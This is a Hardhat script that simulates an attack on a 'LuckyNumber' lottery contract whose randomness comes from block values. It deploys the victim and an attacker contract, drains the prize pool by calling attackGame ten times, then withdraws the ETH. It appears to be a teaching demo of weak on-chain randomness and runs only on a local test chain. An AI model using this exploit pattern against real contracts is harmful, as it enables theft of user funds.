//
// @dev Simulate a random misuse attack
// @description The block.number, block.timestamp and other block characters is
// dangerous, if using these as a random seed, u should be careful.
//
// @reference https://cloud.tencent.com/developer/article/1618181?from=article.detail.1595551
//

const { ethers } = require('hardhat');

async function main() {
    const [owner, user1, attacker] = await ethers.getSigners();
    const LuckyNumber = await ethers.getContractFactory('LuckyNumber', owner);
    const lucky = await LuckyNumber.deploy({value: ethers.utils.parseEther('10.0')});
    await lucky.deployed();

    const AttackLuckyNum = await ethers.getContractFactory('AttackLuckyNum', attacker);
    const attack = await AttackLuckyNum.deploy(lucky.address);
    await attack.deployed();

    console.log(`Owner announces LuckyNumber contract balance: ${ethers.utils.formatEther(await lucky.connect(owner).getBalance())} ETH.\n`);
    console.log(`*** Notice ***`);
    console.log(`u can get 1 ether ETH if u succeeding in guessing number:)\n`);

    console.log(`==== User1 participates the game ====`);
    console.log(`user1 check own balance: ${ethers.utils.formatEther(await user1.getBalance())} ETH`);
    console.log(`user1 guess a number to try to win the reward...`);
    await lucky.connect(user1).luckyNumber(756);
    console.log(`Again: user1 check own balance: ${ethers.utils.formatEther(await user1.getBalance())} ETH\n`);

    console.log(`==== Attacker attacks the game ====`);
    console.log(`attacker balance: ${ethers.utils.formatEther(await attacker.getBalance())} ETH`);
    console.log(`attacker check AttackLuckyNum contract balance: ${ethers.utils.formatEther(await attack.connect(attacker).ownedETH())} ETH`);
    console.log(`attacker attack LuckyNumber...`);
    for (let i = 0; i < 10; i++) {
        await attack.connect(attacker).attackGame();
        console.log(`AttackLuckyNum contract balance: ${ethers.utils.formatEther(await attack.connect(attacker).ownedETH())} ETH`);
    }
    console.log(`Again: attacker check AttackLuckyNum contract balance: ${ethers.utils.formatEther(await attack.connect(attacker).ownedETH())} ETH`);
    console.log(`attacker withdraws ETH from contract...`);
    await attack.connect(attacker).goodbye();
    console.log(`Again: attacker balance: ${ethers.utils.formatEther(await attacker.getBalance())} ETH\n`);

    console.log(`==== Owner check LuckyNumber contract balance ====`);
    console.log(`WOW!!!!OMG`);
    console.log(`LuckyNumber contract balance: ${ethers.utils.formatEther(await lucky.connect(owner).getBalance())} ETH :(\n`);
}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });